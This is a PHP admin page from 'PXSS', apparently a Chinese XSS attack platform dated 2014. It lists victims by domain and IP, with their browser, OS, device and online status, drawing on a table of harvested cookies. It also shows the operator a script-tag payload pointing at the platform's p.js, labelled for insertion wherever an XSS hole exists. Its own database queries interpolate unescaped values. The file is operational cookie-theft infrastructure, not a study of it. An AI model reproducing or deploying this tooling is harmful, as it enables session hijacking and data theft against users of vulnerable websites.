<?php
/**
 * @author: xiaoma
 * @blog  : www.i0day.com
 * @date  : 2014.10.18 16:09
 */
header("Content-type: text/html; charset=utf-8");
require_once '../config/mysql_conn.php';
require_once '../config/session.php';
$project_query = mysql_query("SELECT project_domain, count(distinct project_domain) FROM `pxss_project` group by project_domain order by datetime desc") or
    die("error: " . mysql_error());
       $pro_count_res=mysql_fetch_array(mysql_query("SELECT COUNT(*) FROM `pxss_cookie`"));
       $info_query=mysql_query("SELECT * FROM `pxss_userinfo` WHERE `id`=1");
       $info_res= mysql_fetch_array($info_query);
 ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>PXSS平台</title>

<link href="themes/default/style.css" rel="stylesheet" type="text/css" media="screen"/>
<link href="themes/css/core.css" rel="stylesheet" type="text/css" media="screen"/>
<link href="themes/css/print.css" rel="stylesheet" type="text/css" media="print"/>
<!--[if IE]>
<link href="themes/css/ieHack.css" rel="stylesheet" type="text/css" media="screen"/>
<![endif]-->

<!--[if lte IE 9]>
<script src="js/speedup.js" type="text/javascript"></script>
<![endif]-->

<script src="js/jquery-1.7.2.js" type="text/javascript"></script>
<script type='text/javascript' src="js/jquery.qtip.js"></script>
<link rel="stylesheet" type="text/css" href="js/jquery.qtip.css"/>
<script src="js/jquery.cookie.js" type="text/javascript"></script>
<script src="js/jquery.validate.js" type="text/javascript"></script>
<script src="js/jquery.bgiframe.js" type="text/javascript"></script>
<script src="js/dwztime.js" type="text/javascript"></script>
<!-- svg图表  supports Firefox 3.0+, Safari 3.0+, Chrome 5.0+, Opera 9.5+ and Internet Explorer 6.0+ -->
<script type="text/javascript" src="chart/raphael.js"></script>
<script type="text/javascript" src="chart/g.raphael.js"></script>
<script type="text/javascript" src="chart/g.bar.js"></script>
<script type="text/javascript" src="chart/g.line.js"></script>
<script type="text/javascript" src="chart/g.pie.js"></script>
<script type="text/javascript" src="chart/g.dot.js"></script>

<script src="js/dwz.core.js" type="text/javascript"></script>
<script src="js/dwz.util.date.js" type="text/javascript"></script>
<script src="js/dwz.validate.method.js" type="text/javascript"></script>
<script src="js/dwz.barDrag.js" type="text/javascript"></script>
<script src="js/dwz.drag.js" type="text/javascript"></script>
<script src="js/dwz.tree.js" type="text/javascript"></script>
<script src="js/dwz.accordion.js" type="text/javascript"></script>
<script src="js/dwz.ui.js" type="text/javascript"></script>
<script src="js/dwz.theme.js" type="text/javascript"></script>
<script src="js/dwz.switchEnv.js" type="text/javascript"></script>
<script src="js/dwz.alertMsg.js" type="text/javascript"></script>
<script src="js/dwz.contextmenu.js" type="text/javascript"></script>
<script src="js/dwz.navTab.js" type="text/javascript"></script>
<script src="js/dwz.tab.js" type="text/javascript"></script>
<script src="js/dwz.resize.js" type="text/javascript"></script>
<script src="js/dwz.dialog.js" type="text/javascript"></script>
<script src="js/dwz.dialogDrag.js" type="text/javascript"></script>
<script src="js/dwz.sortDrag.js" type="text/javascript"></script>
<script src="js/dwz.cssTable.js" type="text/javascript"></script>
<script src="js/dwz.stable.js" type="text/javascript"></script>
<script src="js/dwz.taskBar.js" type="text/javascript"></script>
<script src="js/dwz.ajax.js" type="text/javascript"></script>
<script src="js/dwz.pagination.js" type="text/javascript"></script>
<script src="js/dwz.database.js" type="text/javascript"></script>
<script src="js/dwz.datepicker.js" type="text/javascript"></script>
<script src="js/dwz.effects.js" type="text/javascript"></script>
<script src="js/dwz.panel.js" type="text/javascript"></script>
<script src="js/dwz.checkbox.js" type="text/javascript"></script>
<script src="js/dwz.history.js" type="text/javascript"></script>
<script src="js/dwz.combox.js" type="text/javascript"></script>
<script src="js/dwz.print.js" type="text/javascript"></script>

<!-- 可以用dwz.min.js替换前面全部dwz.*.js (注意：替换是下面dwz.regional.zh.js还需要引入)
<script src="bin/dwz.min.js" type="text/javascript"></script>
-->
<script src="js/dwz.regional.zh.js" type="text/javascript"></script>
<script type='text/javascript'>
$(window).load(function(){
 $(document).ready(function()
 {
     $('content').qtip({
       
        show: {
            effect: function() {
                $(this).slideDown();
            }
        },
        hide: {
            effect: function() {
                $(this).slideUp();
            }
        }
     });
 });
});


$(window).load(function(){
 $(document).ready(function()
 {
     $('count').qtip({
       
        show: {
            effect: function() {
                $(this).slideDown();
            }
        },
        hide: {
            effect: function() {
                $(this).slideUp();
            }
        }
     });
 });
});


$(window).load(function(){
 $(document).ready(function()
 {
     $('info').qtip({
       
        show: {
            effect: function() {
                $(this).slideDown();
            }
        },
        hide: {
            effect: function() {
                $(this).slideUp();
            }
        }
     });
 });
});


$(window).load(function(){
 $(document).ready(function()
 {
     $('url').qtip({
       
        show: {
            effect: function() {
                $(this).slideDown();
            }
        },
        hide: {
            effect: function() {
                $(this).slideUp();
            }
        }
     });
 });
});
</script>
<script type="text/javascript">

$(function(){
	DWZ.init("dwz.frag.xml", {
		loginUrl:"login_dialog.html", loginTitle:"登录",	// 弹出登录对话框
//		loginUrl:"login.html",	// 跳到登录页面
		statusCode:{ok:200, error:300, timeout:301}, //【可选】
		pageInfo:{pageNum:"pageNum", numPerPage:"numPerPage", orderField:"orderField", orderDirection:"orderDirection"}, //【可选】
		keys: {statusCode:"statusCode", message:"message"}, //【可选】
		ui:{hideMode:'offsets'}, //【可选】hideMode:navTab组件切换的隐藏方式，支持的值有’display’，’offsets’负数偏移位置的值，默认值为’display’
		debug:false,	// 调试模式 【true|false】
		callback:function(){
			initEnv();
			$("#themeList").theme({themeBase:"themes"}); // themeBase 相对于index页面的主题base路径
		}
	});
});

</script>
</head>

<body scroll="no">
	<div id="layout">
		<div id="header">
			<div class="headerNav">
				<a class="logo" href="http://j-ui.com">标志</a>
				<ul class="nav">

				
					<li><a href="setting.php" target="dialog" width="600">邮箱设置</a></li>
					<li><a href="http://www.i0day.com" target="_blank">博客</a></li>
					
					<li><a href="logout.php">退出</a></li>
				</ul>
				<ul class="themeList" id="themeList">
					<li theme="default"><div class="selected">蓝色</div></li>
					<li theme="green"><div>绿色</div></li>
					<!--<li theme="red"><div>红色</div></li>-->
					<li theme="purple"><div>紫色</div></li>
					<li theme="silver"><div>银色</div></li>
					<li theme="azure"><div>天蓝</div></li>
				</ul>
			</div>

			<!-- navMenu -->
			
		</div>

		<div id="leftside">
			<div id="sidebar_s">
				<div class="collapse">
					<div class="toggleCollapse"><div></div></div>
				</div>
			</div>
			<div id="sidebar" >
				<div class="toggleCollapse"><h2>主菜单</h2><div>收缩</div></div>

				<div class="accordion" fillSpace="sidebar">
					<div class="accordionHeader">
						<h2><span>Folder</span>功能组件</h2>
					</div>
					<div class="accordionContent">
						<ul class="tree treeFolder">
							<li><a href="javascript:;" >控制面板</a>
								<ul>
									<li><a onclick="javascript:history.go(0);"><info title="</br>当前邮箱: <?=$info_res['email']?></br></br>上次登录IP: <?=base64_decode($info_res['last_login_ip'])?></br></br>上次登录时间: <?=$info_res['last_login_time']?></br></br>本次登录IP: <?=base64_decode( $info_res['this_login_ip'])?></br></br>本次登录时间: <?=$info_res['this_login_time']?></br></br>">我的主页</info></a></li>
                                    <li><a href="del_project.php" target="navTab" rel="delpro"><count title="共有 <?=$pro_count_res[0]?> 个项目">删除项目</count></a></li>
								</ul>
							</li>
<?php
      while ($project_res = mysql_fetch_array($project_query)) {
    $domain = $project_res['project_domain'];
    echo " <li><a>".base64_decode($domain)."</a><ul>";
    $project_domain = mysql_query("SELECT * FROM `pxss_project` WHERE `project_domain`='{$domain}'  order by datetime desc");
 
    while ($project_domain_res = mysql_fetch_array($project_domain)) {
        $browser_ico='unknown.png';
        $project_browser=$project_domain_res['project_browser'];
        if(strstr($project_browser,"Firefox"))
        {
            $browser_ico='firefox.png';
        }else if(strstr($project_browser,"IE"))
        {
             $browser_ico='msie.png';
        }else if(strstr($project_browser,"Chrome"))
        {
             $browser_ico='chrome.png';
        }else if(strstr($project_browser,"Opera"))
        {
             $browser_ico='opera.ico';
        }else if(strstr($project_browser,"Safari"))
        {
             $browser_ico='safari.png';
        }else{
            $browser_ico='unknown.png';
        }
        $os_ico='unknown.png';
        $project_os=$project_domain_res['project_os'];
        if(strstr($project_os,"Windows"))
        {
            $os_ico='win.png';
        }else if(strstr($project_os,"BlackBerry"))
        {
            $os_ico='blackberry.png';
        }else if(strstr($project_os,"Android"))
        {
            $os_ico='android.png';
        }else if(strstr($project_os,"Linux"))
        {
            $os_ico='linux.png';
        }else if(strstr($project_os,"iOS"))
        {
            $os_ico='ios.png';
        }else if(strstr($project_os,"QNX"))
        {
            $os_ico='qnx.ico';
        }else if(strstr($project_os,"BeOS"))
        {
            $os_ico='beos.png';
        }else if(strstr($project_os,"webOS"))
        {
            $os_ico='webos.png';
        }else if(strstr($project_os,"Nokia"))
        {
            $os_ico='nokia.ico';
        }else if(strstr($project_os,"Macintosh"))
        {
            $os_ico='mac.png';
        }else if(strstr($project_os,"openbsd"))
        {
            $os_ico='openbsd.ico';
        }else{
            $os_ico='unknown.png';
        }
        $device_ico='unknown.png';
        $project_device=$project_domain_res['project_device'];
        if(strstr($project_device,"iPhone"))
        {
            $device_ico='iphone.jpg';
        }else if(strstr($project_device,"iPod"))
        {
            $device_ico='ipod.jpg';
        }else if(strstr($project_device,"iPad"))
        {
            $device_ico='ipad.png';
        }else if(strstr($project_device,"HTC"))
        {
            $device_ico='htc.ico';
        }else if(strstr($project_device,"Motorola"))
        {
            $device_ico='motorola.png';
        }else if(strstr($project_device,"Zune"))
        {
            $device_ico='zune.gif';
        }else if(strstr($project_device,"Nexus"))
        {
            $device_ico='nexus.png';
        }else if(strstr($project_device,"Ericsson"))
        {
            $device_ico='sony_ericsson.png';
        }else if(strstr($project_device,"Android"))
        {
            $device_ico='android.png';
        }else if(strstr($project_device,"Nokia"))
        {
            $device_ico='nokia.ico';
        }else if(strstr($project_device,"BlackBerry"))
        {
            $device_ico='blackberry.png';
        }else if(strstr($project_device,"Kindle"))
        {
            $device_ico='kindle.png';
        }else if(strstr($project_device,"Virtual"))
        {
            $device_ico='vm.png';
        }else if(strstr($project_device,"Laptop"))
        {
            $device_ico='laptop.png';
        }else{
             $device_ico='unknown.png';
        }
        
        $qq_ico='';
        $stat_line='';
        $datetime=$project_domain_res['datetime'];
        $thetime = gmdate('Y-m-d H:i:s', time() + 3600 * 8);
        $differ_time= strtotime($thetime)-strtotime($datetime);
        if($differ_time < 20)
        {
            $qq_ico='online.png';
            $stat_line='在线';
        }else{
            $qq_ico='offline.png';
            $stat_line='离线';
        }

        $xss_info_query=mysql_query("SELECT * FROM `pxss_cookie` WHERE `cookie_domain`='{$project_domain_res['project_domain']}' AND `cookie_ip`='{$project_domain_res['project_ip']}'");
        $xss_info_res = mysql_fetch_array($xss_info_query);
        if(is_array($xss_info_res))
        {
            $view_info='</br>IP: '.base64_decode($xss_info_res['cookie_ip'])."</br></br>Browser: ".$xss_info_res['browser']."</br></br>Language: ".$xss_info_res['language']."</br></br>System: ".$xss_info_res['os']."</br></br>Hardware: ".$xss_info_res['device']."</br></br>Cpu: ".$xss_info_res['cpu']."</br></br>Date: ".$xss_info_res['datetime']."</br></br>状态：".$stat_line."</br>";
        }
        echo "

<li><a href=\"pxss_info.php?domain={$project_domain_res['project_domain']}&ip={$project_domain_res['project_ip']}\" target=\"navTab\" rel=\"w_panel\"><img src=\"./themes/ico/".$browser_ico."\" height=\"13px\" width=\"13px\"><img src=\"./themes/ico/".$os_ico."\" height=\"13px\" width=\"13px\"><img src=\"./themes/ico/".$device_ico."\" height=\"13px\" width=\"13px\"><img src=\"./themes/ico/".$qq_ico."\" height=\"13px\" width=\"13px\"><content title=\"".$view_info."\">".base64_decode($project_domain_res['project_ip'])."</content></a></li>

";
    }
    echo "</ul></li>";
}
?>

							
						</ul>
					</div>	
							
				</div>
			</div>
		</div>
		<div id="container">
			<div id="navTab" class="tabsPage">
				<div class="tabsPageHeader">
					<div class="tabsPageHeaderContent"><!-- 显示左右控制时添加 class="tabsPageHeaderMargin" -->
						<ul class="navTab-tab">
							<li tabid="main" class="main"><a href="javascript:;"><span><span class="home_icon">我的主页</span></span></a></li>
						</ul>
					</div>
					<div class="tabsLeft">left</div><!-- 禁用只需要添加一个样式 class="tabsLeft tabsLeftDisabled" -->
					<div class="tabsRight">right</div><!-- 禁用只需要添加一个样式 class="tabsRight tabsRightDisabled" -->
					<div class="tabsMore">more</div>
				</div>
				<ul class="tabsMoreList">
					<li><a href="javascript:;">我的主页</a></li>
				</ul>
				<div class="navTab-panel tabsPageContent layoutBox">
					<div class="page unitBox">
						<div class="accountInfo">
							<div class="alertInfo">
								<p><a href="javascript:;" style="line-height:19px"><span>PXSS平台</span></a></p>
								<p><a href="http://www.i0day.com" target="_blank" style="line-height:19px">Www.i0day.com</a></p>
							</div>
														<div class="right">
								<p style="color:blue"><url title="将此段代码插入到存在XSS漏洞的地方"><?php echo htmlspecialchars("<script src=\"http://".$_SERVER['HTTP_HOST'].str_replace('Admin_control/index.php','',$_SERVER['REQUEST_URI'])."p.js\"></script>");?></url></p>
							</div>
                            <p><span><font color="red"><?=$_SESSION["user_name"]?></font>  欢迎回来!</span></p>
						<p><font color="blue"><SPAN id="Clock"></SPAN></font></p>
						</div>
<img src="./themes/xss.jpg" width="919" height="415"></img>
						
						<div style="width:230px;position: absolute;top:60px;right:0" layoutH="80">
							<iframe width="100%" height="430" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=430&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=1749723893&verifier=d4c3622e&dpc=1"></iframe>
						</div>
					</div>
					
				</div>
			</div>
		</div>

	</div>

	<div id="footer">Copyright &copy; 2014 <a href="http://www.i0day.com" target="dialog">PXSS</a> By:Pony</div>



</body>
</html>